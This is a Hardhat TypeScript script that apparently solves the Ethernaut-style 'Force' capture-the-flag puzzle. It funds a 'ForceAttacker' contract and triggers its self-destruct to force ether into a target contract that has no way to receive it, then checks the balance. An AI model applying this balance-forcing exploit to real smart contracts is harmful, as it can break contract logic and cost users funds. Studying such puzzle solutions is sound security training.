// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import contractAddresses from "../constants/contractAddresses.json";
import assert from "assert";
import { BigNumber, providers } from "ethers";

const PLAYER_ADDRESS = contractAddresses.Player;
const CONTRACT = contractAddresses.Force;
const CONTRACTATTACKER = contractAddresses.ForceAttacker;

async function main() {
    console.log("Script to solve Force puzzle \n ========================================== \n");

    const attacker = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Force", CONTRACT);
    const contractAttacker = await ethers.getContractAt("ForceAttacker", CONTRACTATTACKER);

    await attacker.sendTransaction({to: contractAttacker.address, value: ethers.utils.parseEther("0.1")});
    const balanceAttacker = (await ethers.provider.getBalance(contractAttacker.address));
    console.log("BalanceAttacker before destruct = ", balanceAttacker);
    await contractAttacker.triggerDestruct();

    const balance = (await ethers.provider.getBalance(contract.address));
    assert(balance.gt(0), "Balance not increased");
    console.log("Balance increased, you can submit the solution");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
